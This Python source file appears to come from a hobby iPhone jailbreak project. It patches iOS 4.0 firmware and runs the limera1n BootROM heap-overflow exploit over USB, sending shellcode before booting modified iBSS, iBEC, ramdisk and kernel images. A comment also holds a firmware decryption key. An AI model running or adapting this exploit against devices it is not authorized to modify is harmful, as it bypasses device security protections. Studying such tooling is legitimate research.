import struct
import subprocess
import time
from pathlib import Path

import usb
import usb.core

from device import maybe_acquire_device, DeviceMode, acquire_device, acquire_device_with_timeout
from os_build import OsBuildEnum, ImageType
from patcher import regenerate_patched_images, IpswPatcherConfig, generate_patched_ipsw
from recompile_payloads import recompile_payloads
from utils import run_and_check


def recompile_exploit_runner(jailbreak_folder: Path):
    subprocess.run(
        [
            "clang",
            "main.m",
            "-obuild/jailbreak",
            "-I/opt/homebrew/Cellar/libusb/1.0.26/include",
            "-L/opt/homebrew/Cellar/libusb/1.0.26/lib",
            "-framework",
            "Foundation",
            "-lusb-1.0",
        ],
        shell=False,
        cwd=jailbreak_folder
    )


def exploit_and_upload_image(image_path: Path):
    with maybe_acquire_device(DeviceMode.DFU) as maybe_dfu_device:
        if not maybe_dfu_device:
            print('No DFU-mode device detected, will not run exploit or upload image')
            return
        device = maybe_dfu_device

        print(f'Running exploit because we detected a DFU-mode device')

        # Run limera1n
        RECV_IMAGE_BUFFER_BASE = 0x84000000
        RECV_IMAGE_BUFFER_SIZE = 0x2c000
        FOUR_K_PAGE = 0x1000
        DFU_MAX_PACKET_SIZE = 0x800
        stack_addr = 0x8403BF9C
        # Add 1 so the shellcode executes in Thumb
        shellcode_addr = RECV_IMAGE_BUFFER_BASE + RECV_IMAGE_BUFFER_SIZE - FOUR_K_PAGE + 1
        print(f'shellcode_addr {hex(shellcode_addr)}')

        load_region_buf = bytearray([0 for _ in range(RECV_IMAGE_BUFFER_SIZE)])
        load_region_buf[0:DFU_MAX_PACKET_SIZE] = [0xcc for _ in range(DFU_MAX_PACKET_SIZE)]
        for i in range(0, DFU_MAX_PACKET_SIZE, 0x40):
            struct.pack_into("<I", load_region_buf, i + 0, 0x405)
            struct.pack_into("<I", load_region_buf, i + 4, 0x101)
            struct.pack_into("<I", load_region_buf, i + 8, shellcode_addr)
            struct.pack_into("<I", load_region_buf, i + 12, stack_addr)

        # Send the heap fill
        # (This one includes the jump addr)
        print('Sending heap fill')
        device._dfu_upload_data(load_region_buf[0:DFU_MAX_PACKET_SIZE])

        # Fill the heap even more?!
        print('Filling the heap some more')
        load_region_buf[0:DFU_MAX_PACKET_SIZE] = [0xcc for _ in range(DFU_MAX_PACKET_SIZE)]
        #dfu_packet_buf = bytearray([0xcc for _ in range(DFU_MAX_PACKET_SIZE)])
        for i in range(0, RECV_IMAGE_BUFFER_SIZE - 0x1800, DFU_MAX_PACKET_SIZE):
            device._dfu_upload_data(load_region_buf[0:DFU_MAX_PACKET_SIZE])

        print('Sending shellcode')
        securerom_shellcode_path = Path(__file__).parent / "payload_stage1" / "build" / "payload_stage1_shellcode"
        securerom_shellcode = securerom_shellcode_path.read_bytes()
        print(f'SecureROM shellcode length: {len(securerom_shellcode)}')
        device._dfu_upload_data(securerom_shellcode)

        # This might be a heap fill?
        dfu_packet_buf = bytearray([0xbb for _ in range(DFU_MAX_PACKET_SIZE)])
        device.handle.ctrl_transfer(0xa1, 1, 0, 0, dfu_packet_buf, 1000)

        print('Sending arbitrary data to force a timeout')
        class ExpectedUsbTimeout(Exception):
            pass
        try:
            device._dfu_upload_data(dfu_packet_buf, timeout_ms=10)
            raise ExpectedUsbTimeout()
        except usb.core.USBTimeoutError:
            # Expected/desired here
            pass

        # This should fail too
        try:
            device.handle.ctrl_transfer(0x21, 2, 0, 0, dfu_packet_buf, 10)
            raise ExpectedUsbTimeout()
        except usb.core.USBTimeoutError:
            # Expected/desired here
            pass
        print(f'Sent exploit to overflow heap')

        # Reset the device and inform it there's a file ready to be processed
        device.handle.reset()
        device._dfu_notify_upload_finished()
        with acquire_device(DeviceMode.DFU):
            print('Device reconnected limera1n exploit successful')
        usb.util.dispose_resources(device.handle)

    # Give the on-device payload a chance to run
    time.sleep(3)

    # Re-acquire the device as our previous connection is invalidated after running the exploit
    # Allow the device a moment to await an image again
    with acquire_device_with_timeout(DeviceMode.DFU, timeout=3) as dfu_device:
        # Send the image (in DFU mode)
        print(f'Sending {image_path.name} to DFU device...')
        dfu_device.upload_file(image_path)

    # Call this just for the side effect of waiting until the Recovery Mode device pops up
    # If it does, everything worked, and we're all done here
    acquire_device_with_timeout(DeviceMode.Recovery)


def main():
    #dump_usb_devices()
    #return
    patcher_config = IpswPatcherConfig(
        OsBuildEnum.iPhone3_1_4_0_8A293,
        replacement_pictures={
            ImageType.AppleLogo: Path(__file__).parent / "assets" / "boot_logo.png",
        }
    )
    # We need to always recompile the payloads because they may impact what gets injected into the patched images
    recompile_payloads()
    image_types_to_paths = regenerate_patched_images(patcher_config)
    generate_patched_ipsw(patcher_config.os_build, image_types_to_paths)

    # Wait for a DFU device to connect
    print('Awaiting DFU device...')
    with acquire_device_with_timeout(DeviceMode.DFU, timeout=100):
        print(f'Got DFU device')

    exploit_and_upload_image(image_types_to_paths[ImageType.iBSS])
    time.sleep(2)

    # The exploit payload will load and jump to the iBSS, which will present as a Recovery Mode device
    with acquire_device(DeviceMode.Recovery) as recovery_device:
        # Upload and set the boot logo
        recovery_device.upload_file(image_types_to_paths[ImageType.AppleLogo])
        recovery_device.send_command("setpicture")
        recovery_device.send_command("bgcolor 255 255 0")

        # Upload and jump to the iBEC
        recovery_device.upload_file(image_types_to_paths[ImageType.iBEC])

        try:
            recovery_device.send_command("go")
        except usb.core.USBError:
            # The device may drop the connection when jumping to the iBEC, but it's no problem, and we'll reconnect
            # just below.
            pass

    # Give the device a moment to disconnect and reconnect
    time.sleep(5)

    with acquire_device(DeviceMode.Recovery) as recovery_device:
        print(f'Device is now running iBEC {recovery_device}')
        # Set the Apple logo again
        recovery_device.upload_file(image_types_to_paths[ImageType.AppleLogo])
        recovery_device.send_command("setpicture")
        recovery_device.send_command("bgcolor 255 0 255")

        recovery_device.upload_file(Path("/Users/philliptennen/Documents/Jailbreak/ipsw/iPhone3,1_4.0_8A293_Restore.ipsw.unzipped/Firmware/all_flash/all_flash.n90ap.production/DeviceTree.n90ap.img3"))
        recovery_device.send_command("devicetree")
        time.sleep(2)
        # recovery_device.upload_file(Path("/Users/philliptennen/Documents/Jailbreak/ipsw/iPhone3,1_4.0_8A293_Restore.ipsw.unzipped/018-6306-403.dmg"))
        recovery_device.upload_file(image_types_to_paths[ImageType.RestoreRamdisk])
        #recovery_device.upload_file(Path("/Users/philliptennen/Documents/Jailbreak/ipsw/iPhone3,1_4.0_8A293_Restore.ipsw.unzipped/018-6305-405.dmg"))
        #recovery_device.upload_file(Path("/Users/philliptennen/Documents/Jailbreak/ipsw/iPhone3,1_4.0_8A293_Restore.ipsw.unzipped/018-6303-385.dmg"))
        recovery_device.send_command("ramdisk")
        time.sleep(2)
        recovery_device.upload_file(Path("/Users/philliptennen/Documents/Jailbreak/ipsw/iPhone3,1_4.0_8A293_Restore.ipsw.unzipped/kernelcache.release.n90"))
        # PT: Should replace with below, just didn't want to ry 2 things tat once
        #recovery_device.upload_file(image_types_to_paths[ImageType.KernelCache])

        try:
            recovery_device.send_command("bootx")
        except usb.core.USBError:
            # The device may drop the connection when jumping to the kernel, but it's no problem
            pass

    time.sleep(5)

    # Start the restore process with the modified IPSW
    # TODO(PT): Repack into an ipsw as below
    if False:
        run_and_check([
            "/Users/philliptennen/Documents/Jailbreak/tools/idevicerestore/src/idevicerestore",
            "--restore-mode",
            "/Users/philliptennen/Documents/Jailbreak/patched_images/iPhone3,1_4.0_8A293/patched.ipsw",
        ])
    # ./xpwntool /Users/philliptennen/Documents/Jailbreak/ipsw/iPhone3,1_4.0_8A293_Restore.ipsw.unzipped/018-6306-403.dmg decrypted_ramdisk -k 62aabe3e763eb3669b4922468be2acb787199c6b0ef8ae873c312e458d9b9be3 -iv 0ab135879934fdd0d689b3d0f8cf8374

    # dump_usb_devices()


if __name__ == '__main__':
    main()
